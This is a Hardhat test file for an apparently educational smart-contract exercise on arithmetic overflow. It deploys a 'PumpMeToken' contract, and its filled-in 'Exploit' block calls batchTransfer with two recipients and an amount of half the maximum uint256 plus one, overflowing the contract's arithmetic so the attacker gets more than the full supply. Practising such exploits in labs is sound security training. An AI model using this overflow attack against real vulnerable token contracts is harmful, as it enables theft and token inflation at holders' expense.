const { ethers } = require('hardhat');
const { expect } = require('chai');
const { MaxUint256 } = require('ethers');

const { BigNumber } = require("ethers");
const { parseEther } = require("ethers/lib/utils")
const { formatEther } = require("ethers/lib/utils")

describe('Arithmetic Over/Underflow Exercise 4', function () {

    let deployer, attacker;
    const INITIAL_SUPPLY = ethers.utils.parseEther("1000000");

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, attacker] = await ethers.getSigners();

        const pumpMeTokenFactory = await ethers.getContractFactory(
            'contracts/arithmetic-overflows-4/PumpMeToken.sol:PumpMeToken',
            deployer
        );

        this.token = await pumpMeTokenFactory.deploy(INITIAL_SUPPLY);

        let attackerBalance = await this.token.balanceOf(attacker.address);
        let deployerBalance = await this.token.balanceOf(deployer.address);
        expect(attackerBalance).to.equal(0);
        expect(deployerBalance).to.equal(INITIAL_SUPPLY);
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */
        let addressArray = [attacker.address, ethers.constants.AddressZero];
        let attackNumber = ethers.constants.MaxUint256.div(2).add(1);
        await this.token.connect(attacker).batchTransfer(addressArray, attackNumber);

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker should have a lot of tokens (at least more than 1 million)
        let attackerBalanceAfter = await this.token.balanceOf(attacker.address);
        expect(attackerBalanceAfter).to.be.gt(INITIAL_SUPPLY);
    });
});
